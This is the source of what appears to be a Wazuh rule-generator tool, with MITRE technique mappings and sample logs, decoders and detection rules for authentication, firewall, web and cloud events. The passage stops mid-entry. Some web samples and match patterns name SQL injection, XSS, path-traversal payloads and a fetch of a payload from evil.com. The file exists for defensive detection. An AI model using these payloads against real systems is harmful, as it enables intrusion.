/* ========================================
   WAZGEN — Wazuh Rule Generator
   v2.0 — 100+ DB, MITRE Map, Batch, Editor
   ======================================== */

// ==================== MITRE TECHNIQUES ====================
var MITRE_TECH = [
  { id: "T1110", tac: "Credential Access", name: "Brute Force" },
  { id: "T1078", tac: "Defense Evasion", name: "Valid Accounts" },
  { id: "T1046", tac: "Discovery", name: "Network Scan" },
  { id: "T1190", tac: "Initial Access", name: "Web Exploit" },
  { id: "T1059", tac: "Execution", name: "Command & Scripting" },
  { id: "T1548", tac: "Privilege Escalation", name: "Abuse Elevation Control" },
  { id: "T1566", tac: "Initial Access", name: "Phishing" },
  { id: "T1505", tac: "Persistence", name: "Web Shell" },
  {
    id: "T1068",
    tac: "Privilege Escalation",
    name: "Exploitation for Priv Esc",
  },
  { id: "T1071", tac: "Command & Control", name: "App Layer Protocol" },
  { id: "T1048", tac: "Exfiltration", name: "Exfil Over Alt Protocol" },
  { id: "T1595", tac: "Reconnaissance", name: "Active Scanning" },
  { id: "T1098", tac: "Persistence", name: "Account Manipulation" },
  { id: "T1552", tac: "Credential Access", name: "Unsecured Credentials" },
  { id: "T1610", tac: "Defense Evasion", name: "Container Escape" },
  { id: "T1055", tac: "Defense Evasion", name: "Process Injection" },
  { id: "T1210", tac: "Discovery", name: "Exploit Public App" },
  { id: "T1498", tac: "Impact", name: "Network DDoS" },
  { id: "T1203", tac: "Execution", name: "Exec via Client" },
  { id: "T1105", tac: "Command & Control", name: "Ingress Tool Transfer" },
  { id: "T1053", tac: "Execution", name: "Scheduled Task" },
  { id: "T1059.001", tac: "Execution", name: "PowerShell" },
  { id: "T1059.007", tac: "Execution", name: "XSS" },
  { id: "T1071.004", tac: "Command & Control", name: "DNS C2" },
  { id: "T1543.003", tac: "Persistence", name: "Windows Service" },
  { id: "T1505.003", tac: "Persistence", name: "Web Shell" },
  { id: "T1572", tac: "Command & Control", name: "C2 Tunnel" },
  { id: "T1613", tac: "Discovery", name: "K8s Audit" },
  { id: "T1069", tac: "Discovery", name: "Permission Groups" },
  { id: "T1204", tac: "Execution", name: "User Execution" },
  { id: "T1555", tac: "Credential Access", name: "Credentials from Stores" },
  { id: "T1003", tac: "Credential Access", name: "OS Credential Dumping" },
  { id: "T1562", tac: "Defense Evasion", name: "Impair Defenses" },
  { id: "T1569", tac: "Execution", name: "System Services" },
  { id: "T1574", tac: "Persistence", name: "Hijack Execution Flow" },
  { id: "T1036", tac: "Defense Evasion", name: "Masquerading" },
];

// ==================== DATABASE (100+ Patterns) ====================
var DB = [
  // === AUTHENTICATION ===
  {
    id: "ssh_fail",
    cat: "auth",
    name: "SSH Failed Password",
    prog: "sshd",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2",
    dc: {
      n: "sshd-auth-fail",
      p: "sshd",
      pm: "Failed password for",
      rx: "Failed password for (\\S+) from (\\d+\\.\\d+\\.\\d+\\.\\d+) port (\\d+)",
      o: "user, srcip, srcport",
    },
    rl: {
      is: "5716",
      lv: 10,
      gr: "authentication_failed",
      mt: "Failed password",
      ds: "SSH authentication failed",
    },
    mi: ["T1110"],
    th: "5x / 60s",
  },
  {
    id: "ssh_inv",
    cat: "auth",
    name: "SSH Invalid User",
    prog: "sshd",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server sshd[1234]: Failed password for invalid user admin from 10.0.0.50 port 22 ssh2",
    dc: {
      n: "sshd-auth-fail",
      p: "sshd",
      pm: "Failed password for invalid",
      rx: "Failed password for invalid user (\\S+) from (\\d+\\.\\d+\\.\\d+\\.\\d+) port (\\d+)",
      o: "user, srcip, srcport",
    },
    rl: {
      is: "5716",
      lv: 10,
      gr: "authentication_failed,recon",
      mt: "invalid user",
      ds: "SSH invalid user attempt",
    },
    mi: ["T1110", "T1046"],
    th: "3x / 30s",
  },
  {
    id: "ssh_ok",
    cat: "auth",
    name: "SSH Successful",
    prog: "sshd",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server sshd[1234]: Accepted password for admin from 192.168.1.100 port 22 ssh2",
    dc: {
      n: "sshd-auth",
      p: "sshd",
      pm: "Accepted",
      rx: "Accepted (\\w+) for (\\S+) from (\\d+\\.\\d+\\.\\d+\\.\\d+) port (\\d+)",
      o: "auth_method, user, srcip, srcport",
    },
    rl: {
      is: "5715",
      lv: 3,
      gr: "authentication_success",
      mt: "Accepted",
      ds: "SSH successful",
    },
    mi: ["T1078"],
    th: "Monitor",
  },
  {
    id: "ssh_pubkey",
    cat: "auth",
    name: "SSH Public Key Auth",
    prog: "sshd",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server sshd[1234]: Accepted publickey for admin from 192.168.1.100 port 22 ssh2",
    dc: {
      n: "sshd-pubkey",
      p: "sshd",
      pm: "Accepted publickey",
      rx: "Accepted publickey for (\\S+) from (\\d+\\.\\d+\\.\\d+\\.\\d+) port (\\d+)",
      o: "user, srcip, srcport",
    },
    rl: {
      is: "5715",
      lv: 3,
      gr: "authentication_success",
      mt: "Accepted publickey",
      ds: "SSH public key auth",
    },
    mi: ["T1078"],
    th: "Monitor",
  },
  {
    id: "sudo_ok",
    cat: "auth",
    name: "Sudo Executed",
    prog: "sudo",
    fmt: "syslog",
    ex: "Jun 29 11:05:33 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash",
    dc: {
      n: "sudo-cmd",
      p: "sudo",
      pm: "COMMAND=",
      rx: "(\\S+) : TTY=(\\S+) ; PWD=(\\S+) ; USER=(\\S+) ; COMMAND=(.*)",
      o: "srcuser, tty, cwd, dstuser, command",
    },
    rl: {
      is: "5400",
      lv: 7,
      gr: "priv_escalation",
      mt: "COMMAND=",
      ds: "Sudo command executed",
    },
    mi: ["T1548"],
    th: "Monitor /bin/bash",
  },
  {
    id: "sudo_fail",
    cat: "auth",
    name: "Sudo Failed",
    prog: "sudo",
    fmt: "syslog",
    ex: "Jun 29 11:06:01 server sudo: admin : 1 incorrect password attempt ; TTY=pts/0 ; USER=root ; COMMAND=/bin/su",
    dc: {
      n: "sudo-fail",
      p: "sudo",
      pm: "incorrect password",
      rx: "(\\S+) : .+ USER=(\\S+) ; COMMAND=(.*)",
      o: "srcuser, dstuser, command",
    },
    rl: {
      is: "5402",
      lv: 8,
      gr: "authentication_failed,priv_escalation",
      mt: "incorrect password",
      ds: "Failed sudo attempt",
    },
    mi: ["T1548", "T1110"],
    th: "3x / 60s",
  },
  {
    id: "pam",
    cat: "auth",
    name: "PAM Auth Failure",
    prog: "login",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server login[1234]: FAILED LOGIN (1) on /dev/tty1 FOR root, Authentication failure",
    dc: {
      n: "pam-auth",
      p: "login",
      pm: "FAILED LOGIN",
      rx: "FAILED LOGIN .+ FOR '(\\S+)'",
      o: "user",
    },
    rl: {
      is: "25020",
      lv: 8,
      gr: "authentication_failed,pam",
      mt: "FAILED LOGIN",
      ds: "PAM authentication failure",
    },
    mi: ["T1110"],
    th: "5x / 60s",
  },
  {
    id: "ftp",
    cat: "auth",
    name: "FTP Brute Force",
    prog: "vsftpd",
    fmt: "syslog",
    ex: 'Jun 29 10:23:11 server vsftpd[1234]: FAIL LOGIN: Client "192.168.1.100", User: "admin"',
    dc: {
      n: "ftp-brute",
      p: "vsftpd",
      pm: "FAIL LOGIN",
      rx: 'Client "(\\S+)", User: "(\\S+)"',
      o: "srcip, user",
    },
    rl: {
      is: "25010",
      lv: 10,
      gr: "authentication_failed,ftp",
      mt: "FAIL LOGIN",
      ds: "FTP auth failure",
    },
    mi: ["T1110"],
    th: "10x / 60s",
  },
  {
    id: "fail2ban",
    cat: "auth",
    name: "Fail2ban Ban",
    prog: "fail2ban",
    fmt: "syslog",
    ex: "2026-06-29 10:23:11,123 fail2ban.actions [12345]: NOTICE [sshd] Ban 192.168.1.100",
    dc: {
      n: "fail2ban-ban",
      p: "fail2ban",
      pm: "Ban",
      rx: "\\[(\\S+)\\] Ban (\\S+)",
      o: "jail, srcip",
    },
    rl: { lv: 5, gr: "fail2ban", mt: "Ban", ds: "Fail2ban banned IP" },
    mi: ["T1110"],
    th: "Monitor",
  },
  {
    id: "crowdsec",
    cat: "auth",
    name: "CrowdSec Alert",
    prog: "crowdsec",
    fmt: "kv",
    ex: 'time="2026-06-29T10:23:11+07:00" level=info msg="Signal: ip 192.168.1.100 blocked by scenario ssh-bf"',
    dc: {
      n: "crowdsec-alert",
      p: "crowdsec",
      pm: "Signal:",
      rx: "ip (\\S+) blocked by scenario (\\S+)",
      o: "srcip, scenario",
    },
    rl: { lv: 5, gr: "crowdsec", mt: "Signal:", ds: "CrowdSec blocked IP" },
    mi: ["T1110"],
    th: "Monitor",
  },
  {
    id: "openbao",
    cat: "auth",
    name: "Vault Auth Failure",
    prog: "vault",
    fmt: "syslog",
    ex: '2026-06-29T10:23:11.123Z [ERROR] core: login failed: path=userpass/login/admin error="invalid credentials"',
    dc: {
      n: "vault-auth",
      p: "vault",
      pm: "login failed",
      rx: 'path=(\\S+) error="(.+)"',
      o: "auth_path, error",
    },
    rl: {
      lv: 10,
      gr: "vault,auth",
      mt: "login failed",
      ds: "Vault authentication failure",
    },
    mi: ["T1110"],
    th: "5x / 60s",
  },
  {
    id: "radius_fail",
    cat: "auth",
    name: "RADIUS Auth Failure",
    prog: "radiusd",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server radiusd[1234]: Login incorrect (admin): [192.168.1.100/0]",
    dc: {
      n: "radius-fail",
      p: "radiusd",
      pm: "Login incorrect",
      rx: "Login incorrect \\((\\S+)\\): \\[(\\S+)/(\\d+)\\]",
      o: "user, srcip, port",
    },
    rl: {
      is: "25020",
      lv: 8,
      gr: "authentication_failed,radius",
      mt: "Login incorrect",
      ds: "RADIUS auth failure",
    },
    mi: ["T1110"],
    th: "5x / 60s",
  },
  {
    id: "ldap_fail",
    cat: "auth",
    name: "LDAP Auth Failure",
    prog: "slapd",
    fmt: "syslog",
    ex: 'Jun 29 10:23:11 server slapd[1234]: conn=1234 op=0 BIND dn="cn=admin,dc=example,dc=com" mech=SIMPLE ssf=0 failed',
    dc: {
      n: "ldap-fail",
      p: "slapd",
      pm: "BIND.*failed",
      rx: 'BIND dn="([^"]+)".+failed',
      o: "bind_dn",
    },
    rl: {
      lv: 8,
      gr: "authentication_failed,ldap",
      mt: "BIND.*failed",
      ds: "LDAP bind failed",
    },
    mi: ["T1110"],
    th: "10x / 60s",
  },

  // === FIREWALL / NETWORK ===
  {
    id: "iptables",
    cat: "fw",
    name: "IPTables Drop",
    prog: "kernel",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server kernel: [12345] DROP IN=eth0 SRC=203.0.113.5 DST=10.0.0.1 PROTO=TCP SPT=54321 DPT=22",
    dc: {
      n: "iptables-drop",
      p: "kernel",
      pm: "DROP",
      rx: "SRC=(\\S+) DST=(\\S+) .* PROTO=(\\S+) SPT=(\\d+) DPT=(\\d+)",
      o: "srcip, dstip, protocol, srcport, dstport",
    },
    rl: {
      is: "40600",
      lv: 7,
      gr: "firewall,drop",
      mt: "DROP",
      ds: "IPTables dropped packet",
    },
    mi: ["T1046"],
    th: "20x / 60s",
  },
  {
    id: "nftables",
    cat: "fw",
    name: "Nftables Drop",
    prog: "kernel",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server kernel: [12345] nft DROP IN=eth0 SRC=203.0.113.5 DST=10.0.0.1 PROTO=TCP DPT=22",
    dc: {
      n: "nftables-drop",
      p: "kernel",
      pm: "nft DROP",
      rx: "SRC=(\\S+) DST=(\\S+) .* PROTO=(\\S+) DPT=(\\d+)",
      o: "srcip, dstip, protocol, dstport",
    },
    rl: {
      is: "40600",
      lv: 7,
      gr: "firewall,drop",
      mt: "nft DROP",
      ds: "Nftables dropped packet",
    },
    mi: ["T1046"],
    th: "20x / 60s",
  },
  {
    id: "firewalld",
    cat: "fw",
    name: "Firewalld Deny",
    prog: "firewalld",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server firewalld[1234]: DENY: IN=eth0 SRC=203.0.113.5 DST=10.0.0.1 PROTO=TCP DPT=443",
    dc: {
      n: "firewalld-deny",
      p: "firewalld",
      pm: "DENY:",
      rx: "SRC=(\\S+) DST=(\\S+) PROTO=(\\S+) DPT=(\\d+)",
      o: "srcip, dstip, protocol, dstport",
    },
    rl: {
      lv: 7,
      gr: "firewall,deny",
      mt: "DENY:",
      ds: "Firewalld denied packet",
    },
    mi: ["T1046"],
    th: "20x / 60s",
  },
  {
    id: "fortigate",
    cat: "fw",
    name: "FortiGate Traffic Log",
    prog: "fortigate",
    fmt: "syslog",
    ex: 'date=2026-06-29 time=10:23:11 devname="FGT-100D" devid="FG100D123" logid="0000000013" type="traffic" subtype="forward" level="notice" srcip=203.0.113.5 srcport=54321 srcintf="wan1" dstip=10.0.0.1 dstport=80 dstintf="internal" action="deny"',
    dc: {
      n: "fortigate-traffic",
      p: "fortigate",
      pm: 'action="deny"|action="block"',
      rx: 'srcip=(\\S+) srcport=(\\d+) dstip=(\\S+) dstport=(\\d+) action="(\\w+)"',
      o: "srcip, srcport, dstip, dstport, action",
    },
    rl: {
      lv: 7,
      gr: "fortigate,firewall,deny",
      mt: 'action="deny"',
      ds: "FortiGate denied traffic",
    },
    mi: ["T1046"],
    th: "20x / 60s",
  },
  {
    id: "fortigate_auth",
    cat: "fw",
    name: "FortiGate Admin Login",
    prog: "fortigate",
    fmt: "syslog",
    ex: 'date=2026-06-29 time=10:23:11 devname="FGT-100D" logid="0100032001" type="event" subtype="admin" level="alert" user="admin" srcip=192.168.1.100 status="failed"',
    dc: {
      n: "fortigate-admin",
      p: "fortigate",
      pm: 'subtype="admin"',
      rx: 'user="(\\S+)" srcip=(\\S+) status="(\\w+)"',
      o: "user, srcip, status",
    },
    rl: {
      lv: 10,
      gr: "fortigate,auth",
      mt: 'subtype="admin"',
      ds: "FortiGate admin login",
    },
    mi: ["T1110", "T1078"],
    th: "5x / 60s",
  },
  {
    id: "fortigate_vpn",
    cat: "fw",
    name: "FortiGate VPN Login",
    prog: "fortigate",
    fmt: "syslog",
    ex: 'date=2026-06-29 time=10:23:11 devname="FGT-100D" logid="0101037128" type="event" subtype="vpn" level="alert" user="admin" srcip=203.0.113.5 tunnelip="10.0.0.2" status="success"',
    dc: {
      n: "fortigate-vpn",
      p: "fortigate",
      pm: 'subtype="vpn"',
      rx: 'user="(\\S+)" srcip=(\\S+) status="(\\w+)"',
      o: "user, srcip, status",
    },
    rl: {
      lv: 10,
      gr: "fortigate,vpn,auth",
      mt: 'subtype="vpn"',
      ds: "FortiGate VPN login",
    },
    mi: ["T1078", "T1110"],
    th: "Monitor",
  },
  {
    id: "cisco_asa",
    cat: "fw",
    name: "Cisco ASA Deny",
    prog: "ciscoasa",
    fmt: "syslog",
    ex: '%ASA-4-106023: Deny tcp src outside:203.0.113.5/54321 dst inside:10.0.0.1/80 by access-group "OUTSIDE_IN"',
    dc: {
      n: "cisco-asa-deny",
      p: "ciscoasa",
      pm: "Deny",
      rx: "Deny \\w+ src \\w+:(\\S+)/(\\d+) dst \\w+:(\\S+)/(\\d+)",
      o: "srcip, srcport, dstip, dstport",
    },
    rl: {
      lv: 7,
      gr: "cisco,firewall,deny",
      mt: "Deny",
      ds: "Cisco ASA denied traffic",
    },
    mi: ["T1046"],
    th: "20x / 60s",
  },
  {
    id: "cisco_asa_auth",
    cat: "fw",
    name: "Cisco ASA Auth Fail",
    prog: "ciscoasa",
    fmt: "syslog",
    ex: "%ASA-5-111008: User 'admin' executed 'enable' command on '192.168.1.100' — authentication failed",
    dc: {
      n: "cisco-asa-auth",
      p: "ciscoasa",
      pm: "authentication failed",
      rx: "User '(\\S+)' executed.+on '(\\S+)'",
      o: "user, srcip",
    },
    rl: {
      lv: 10,
      gr: "cisco,auth",
      mt: "authentication failed",
      ds: "Cisco ASA auth failure",
    },
    mi: ["T1110"],
    th: "5x / 60s",
  },
  {
    id: "paloalto",
    cat: "fw",
    name: "Palo Alto Threat",
    prog: "paloalto",
    fmt: "syslog",
    ex: "1,2026/06/29 10:23:11,THREAT,url,192.168.1.100,203.0.113.5,user,web-browsing,evil.com,80,38392,2026/06/29 10:23:11,,,informational,client-to-server,,,0,0,0,0,0,0,0,,,,",
    dc: {
      n: "paloalto-threat",
      p: "paloalto",
      pm: "THREAT",
      rx: "^\\d+,([^,]+),THREAT,\\w+,(\\S+),(\\S+),(\\S+),(\\S+),(\\S+),(\\d+)",
      o: "timestamp, srcip, dstip, user, category, url, port",
    },
    rl: {
      lv: 10,
      gr: "paloalto,threat",
      mt: "THREAT",
      ds: "Palo Alto threat detected",
    },
    mi: ["T1203", "T1071"],
    th: "Monitor",
  },
  {
    id: "pfsense",
    cat: "fw",
    name: "pfSense Block",
    prog: "pfsense",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server pf: DROP IN=wan SRC=203.0.113.5 DST=10.0.0.1 PROTO=TCP SPT=54321 DPT=443",
    dc: {
      n: "pfsense-block",
      p: "pfsense",
      pm: "DROP",
      rx: "SRC=(\\S+) DST=(\\S+) .* PROTO=(\\S+) SPT=(\\d+) DPT=(\\d+)",
      o: "srcip, dstip, protocol, srcport, dstport",
    },
    rl: {
      lv: 7,
      gr: "pfsense,firewall,deny",
      mt: "DROP",
      ds: "pfSense blocked traffic",
    },
    mi: ["T1046"],
    th: "20x / 60s",
  },
  {
    id: "sophos",
    cat: "fw",
    name: "Sophos UTM Block",
    prog: "sophos",
    fmt: "syslog",
    ex: "Jun 29 10:23:11 server sophos[1234]: [ID: 1234] [BLOCK] IN=eth0 SRC=203.0.113.5 DST=10.0.0.1 PROTO=TCP SPT=54321 DPT=443 ACC=DROP",
    dc: {
      n: "sophos-block",
      p: "sophos",
      pm: "BLOCK",
      rx: "SRC=(\\S+) DST=(\\S+) .* PROTO=(\\S+) SPT=(\\d+) DPT=(\\d+)",
      o: "srcip, dstip, protocol, srcport, dstport",
    },
    rl: { lv: 7, gr: "sophos,firewall", mt: "BLOCK", ds: "Sophos UTM blocked" },
    mi: ["T1046"],
    th: "20x / 60s",
  },

  // === WEB ===
  {
    id: "squid",
    cat: "web",
    name: "Squid URL Blocked",
    prog: "squid",
    fmt: "syslog",
    ex: "2025-06-20T07:49:26.179+0000 1 192.168.100.10 TCP_DENIED/403 4321 GET http://evil.com/payload.exe",
    dc: {
      n: "squid-access",
      p: "squid",
      pm: "TCP_DENIED",
      rx: "(\\d+\\.\\d+\\.\\d+\\.\\d+) TCP_DENIED/(\\d+) (\\d+) (\\S+) (\\S+)",
      o: "srcip, id, extra, protocol, url",
    },
    rl: {
      is: "31102",
      lv: 10,
      gr: "web_block,attack",
      mt: "TCP_DENIED",
      ds: "Squid blocked URL",
    },
    mi: ["T1566", "T1071"],
    th: "10x / 120s",
  },
  {
    id: "web_trav",
    cat: "web",
    name: "Path Traversal",
    prog: "apache|nginx",
    fmt: "syslog",
    ex: '192.168.1.50 - - [29/Jun/2026:10:15:22 +0700] "GET /admin/../../../etc/passwd HTTP/1.1" 404 512',
    dc: {
      n: "web-access",
      p: "apache-httpd",
      pm: "GET|POST|PUT",
      rx: '(\\d+\\.\\d+\\.\\d+\\.\\d+) - - \\[\\S+ \\+\\d+\\] "(\\w+) (\\S+) HTTP/[\\d\\.]+" (\\d+)',
      o: "srcip, method, url, status",
    },
    rl: {
      is: "31101",
      lv: 12,
      gr: "web,attack",
      mt: "../|etc/passwd",
      ds: "Path traversal attempt",
    },
    mi: ["T1190", "T1055"],
    th: "5x / 120s",
  },
  {
    id: "web_sqli",
    cat: "web",
    name: "SQL Injection",
    prog: "apache|nginx",
    fmt: "syslog",
    ex: '192.168.1.50 - - [29/Jun/2026:10:15:22 +0700] "GET /search?q=1 UNION SELECT * FROM users-- HTTP/1.1" 200 1234',
    dc: {
      n: "web-access",
      p: "apache-httpd",
      pm: "UNION|SELECT|INSERT",
      rx: '(\\d+\\.\\d+\\.\\d+\\.\\d+) - - \\[\\S+ \\+\\d+\\] "(\\w+) (\\S+) HTTP/[\\d\\.]+" (\\d+)',
      o: "srcip, method, url, status",
    },
    rl: {
      is: "31101",
      lv: 10,
      gr: "web,sql_injection",
      mt: "UNION SELECT|xpcmshell|DROP TABLE",
      ds: "SQL injection attempt",
    },
    mi: ["T1190"],
    th: "8x / 120s",
  },
  {
    id: "web_xss",
    cat: "web",
    name: "XSS Attempt",
    prog: "apache|nginx",
    fmt: "syslog",
    ex: '192.168.1.50 - - [29/Jun/2026:10:15:22 +0700] "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 200 512',
    dc: {
      n: "web-access",
      p: "apache-httpd",
      pm: "script|onerror|onload",
      rx: '(\\d+\\.\\d+\\.\\d+\\.\\d+) - - \\[\\S+ \\+\\d+\\] "(\\w+) (\\S+) HTTP/[\\d\\.]+" (\\d+)',
      o: "srcip, method, url, status",
    },
    rl: {
      is: "31101",
      lv: 10,
      gr: "web,xss,attack",
      mt: "<script|%3Cscript|onerror=",
      ds: "XSS attempt",
    },
    mi: ["T1059.007"],
    th: "10x / 120s",
  },
  {
    id: "web_404",
    cat: "web",
    name: "404 Scan",
    prog: "apache|nginx",
    fmt: "syslog",
    ex: '192.168.1.50 - - [29/Jun/2026:10:15:22 +0700] "GET /wp-admin/admin-ajax.php HTTP/1.1" 404 512',
    dc: {
      n: "web-access",
      p: "apache-httpd",
      pm: "GET",
      rx: '(\\d+\\.\\d+\\.\\d+\\.\\d+) - - \\[\\S+ \\+\\d+\\] "(\\w+) (\\S+) HTTP/[\\d\\.]+" (\\d+)',
      o: "srcip, method, url, status",
    },
    rl: {
      is: "31101",
      lv: 5,
      gr: "web,recon",
      mt: '" 404 ',
      ds: "Web 404 — possible dir enum",
    },
    mi: ["T1595"],
    th: "15x / 120s",
  },
  {
    id: "apache_err",
    cat: "web",
    name: "Apache Error Log",
    prog: "apache",
    fmt: "syslog",
    ex: "[Wed Jun 29 10:23:11.123456 2026] [php:error] [pid 1234] [client 192.168.1.1:54321] PHP Fatal error: Uncaught Exception",
    dc: {
      n: "apache-error",
      p: "apache-httpd",
      pm: "PHP Fatal|AH00111",
      rx: "\\[client (\\S+):\\d+\\] (.+)",
      o: "srcip, error_msg",
    },
    rl: {
      lv: 7,
      gr: "web,server_error",
      mt: "PHP Fatal|AH00111",
      ds: "Apache error",
    },
    mi: ["T1190"],
    th: "Monitor repeated",
  },
  {
    id: "nginx_err",
    cat: "web",
    name: "Nginx Error",
    prog: "nginx",
    fmt: "syslog",
    ex: "2026/06/29 10:23:11 [error] 1234#1234: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.1.1, server: example.com",
    dc: {
      n: "nginx-error",
      p: "nginx",
      pm: "[error]",
      rx: "client: (\\S+), server: (\\S+)",
      o: "srcip, server",
    },
    rl: { lv: 7, gr: "web,server_error", mt: "[error]", ds: "Nginx error" },
    mi: ["T1190"],
    th: "Monitor repeated",
  },
  {
    id: "haproxy",
    cat: "web",
    name: "HAProxy SQLi",
    prog: "haproxy",
    fmt: "syslog",
    ex: 'Jun 29 10:23:11 server haproxy[1234]: 192.168.1.100:54321 [29/Jun/2026:10:23:11] frontend~ 0/0/1/12/13 200 1234 - "GET /search?q=1 UNION SELECT * FROM users HTTP/1.1"',
    dc: {
      n: "haproxy",
      p: "haproxy",
      pm: "UNION|SELECT|DROP",
      rx: '(\\S+):(\\d+) \\[\\S+\\] .+ "(\\w+) (\\S+) HTTP',
      o: "srcip, srcport, method, url",
    },
    rl: {
      is: "831103",
      lv: 7,
      gr: "haproxy,sql_injection",
      mt: "UNION SELECT|DROP TABLE",
      ds: "HAProxy SQL injection",
    },
    mi: ["T1190"],
    th: "8x / 120s",
  },
  {
    id: "iis",
    cat: "web",
    name: "IIS Web Log",
    prog: "iis",
    fmt: "syslog",
    ex: "192.168.1.50, -, 29/Jun/2026:10:15:22 +0700, GET, /admin/etc/passwd, 404, 512, Mozilla/5.0",
    dc: {
      n: "iis-log",
      p: "iis",
      pm: "GET|POST|PUT",
      rx: "(\\S+), -, \\[\\S+\\], (\\w+), (\\S+), (\\d+)",
      o: "srcip, method, url, status",
    },
    rl: { lv: 5, gr: "web,iis", mt: "404|500", ds: "IIS web access" },
    mi: ["T1595"],
    th: "Monitor",
  },
  {
    id: "cloudflare",
    cat: "web",
    name: "Cloudflare WAF Block",
    prog: "cloudflare",
    fmt: "syslog",
    ex: "2026-06-29T10:23:11Z [Cloudflare] WAF: Blocked request from 192.168.1.100 to example.com — SQLi detected",
    dc: {
      n: "cloudflare-waf",
      p: "cloudflare",
      pm: "WAF: Blocked",
      rx: "WAF: Blocked request from (\\S+) to (\\S+) — (.+)",
      o: "srcip, target, reason",
    },
    rl: {
      lv: 10,
      gr: "cloudflare,waf,web",
      mt: "WAF: Blocked",
      ds: "Cloudflare WAF blocked",
    },
    mi: ["T1190"],
    th: "Monitor",
  },
  {
    id: "tomcat",
    cat: "web",
    name: "Tomcat Error",
    prog: "tomcat",
    fmt: "syslog",
    ex: "29-Jun-2026 10:23:11.123 SEVERE [http-nio-8080-exec-1] org.apache.catalina.core.StandardWrapperValve.invoke Servlet.service() for servlet [default] threw exception [org.apache.catalina.core.StandardWrapperValve.invoke]",
    dc: {
      n: "tomcat-error",
      p: "tomcat",
      pm: "SEVERE|EXCEPTION",
      rx: "SEVERE \\[.+\\] (.+)",
      o: "error_msg",
    },
    rl: {
      lv: 7,
      gr: "web,tomcat,server_error",
      mt: "SEVERE|EXCEPTION",
      ds: "Tomcat error",
    },
    mi: ["T1190"],
    th: "Monitor",
  },
  {
    id: "caddy",
    cat: "web",
    name: "Caddy Access Log",
    prog: "caddy",
    fmt: "json",
    ex: '{"level":"error","ts":"2026-06-29T10:23:11Z","logger":"http.log.access","msg":"handled request","request":{"remote_ip":"192.168.1.100","host":"example.com","method":"GET","uri":"/etc/passwd","status":404}}',
    dc: { n: "caddy-access", p: "json", ty: "json", pm: "remote_ip" },
    rl: { lv: 7, gr: "web,caddy", ds: "Caddy error access" },
    mi: ["T1190"],
    th: "Monitor",
  },

  // === CLOUD ===
  {
    id: "aws_console",
    cat: "cloud",
    name: "AWS Console Login",
    prog: "aws",
    fmt: "json",
    ex: '{"eventVersion":"1.08","userIdentity":{"arn":"arn:aws:iam::123456789012:user/admin"},"eventName":"ConsoleLogin","sourceIPAddress":"203.0.113.5","responseElements":{"ConsoleLogin":"Success"}}',
    dc: { n: "aws-cloudtrail", p: "json", ty: "json", pm: "ConsoleLogin" },
    rl: { lv: 7, gr: "aws,cloud,authentication", ds: "AWS Console login" },
    mi: ["T1078"],
    th: "Unusual geo",
  },
  {
    id: "aws_iam",
    cat: "cloud",
    name: "AWS IAM Change",
    prog: "aws",
    fmt: "json",
    ex: '{"eventVersion":"1.08","eventName":"PutUserPolicy","userIdentity":{"arn":"arn:aws:iam::123456789012:user/admin"},"requestParameters":{"policyDocument":"..."}}',
    dc: {
      n: "aws-cloudtrail",
      p: "json",
      ty: "json",
      pm: "PutUserPolicy|CreateUser|CreateRole",
    },
    rl: { lv: 10, gr: "aws,cloud,iam", ds: "AWS IAM modified" },
    mi: ["T1098"],
    th: "Any IAM change",
  },
  {
    id: "aws_s3",
    cat: "cloud",
    name: "AWS S3 Public Access",
    prog: "aws",
    fmt: "json",
    ex: '{"eventVersion":"1.08","eventName":"PutBucketAcl","requestParameters":{"bucketName":"secret-data","acl":"public-read"},"sourceIPAddress":"203.0.113.5"}',
    dc: {
      n: "aws-cloudtrail",
      p: "json",
      ty: "json",
      pm: "PutBucketAcl|PutBucketPolicy",
    },
    rl: { lv: 12, gr: "aws,cloud,s3", ds: "S3 bucket made public" },
    mi: ["T1048"],
    th: "Any public ACL",
  },
  {
    id: "azure_signin",
    cat: "cloud",
    name: "Azure AD Sign-In Failure",
    prog: "azure",
    fmt: "json",
    ex: '{"time":"2026-06-29T10:23:11Z","resourceId":"/tenants/tenant-id","operationName":"Sign-in activity","properties":{"userPrincipalName":"admin@contoso.com","appDisplayName":"Azure Portal","ipAddress":"203.0.113.5","status":"Failed","failureReason":"Invalid username or password"}}',
    dc: { n: "azure-signin", p: "json", ty: "json", pm: "Sign-in activity" },
    rl: { lv: 10, gr: "azure,cloud,auth", ds: "Azure AD sign-in failure" },
    mi: ["T1110", "T1078"],
    th: "10x / 300s",
  },
  {
    id: "azure_audit",
    cat: "cloud",
    name: "Azure Audit Change",
    prog: "azure",
    fmt: "json",
    ex: '{"time":"2026-06-29T10:23:11Z","resourceId":"/subscriptions/sub-id","operationName":"Create Role Assignment","properties":{"principal":"admin@contoso.com","role":"Owner","scope":"/subscriptions/sub-id"}}',
    dc: {
      n: "azure-audit",
      p: "json",
      ty: "json",
      pm: "Create Role Assignment|Delete Role Assignment",
    },
    rl: {
      lv: 10,
      gr: "azure,cloud,audit",
      ds: "Azure role assignment changed",
    },
    mi: ["T1098"],
    th: "Any role change",
  },
  {
    id: "azure_nsg",
    cat: "cloud",
    name: "Azure NSG Flow",
    prog: "azure",
    fmt: "json",
    ex: '{"time":"2026-06-29T10:23:11Z","resourceId":"/subscriptions/sub-id/resourceGroups/rg/providers/Microsoft.Network/networkSecurityGroups/nsg1","operationName":"NetworkSecurityGroupFlowEvents","properties":{"flows":[{"rule":"DenyAll","srcIp":"203.0.113.5","dstIp":"10.0.0.1","srcPort":"54321","dstPort":"443","protocol":"TCP","action":"Deny"}]}}',
    dc: { n: "azure-nsg", p: "json", ty: "json", pm: "Deny" },
    rl: { lv: 7, gr: "azure,network,firewall", ds: "Azure NSG denied flow" },
    mi: ["T1046"],
    th: "Monitor",
  },
  {
    id: "gcp_audit",
    cat: "cloud",
    name: "GCP Audit Log",
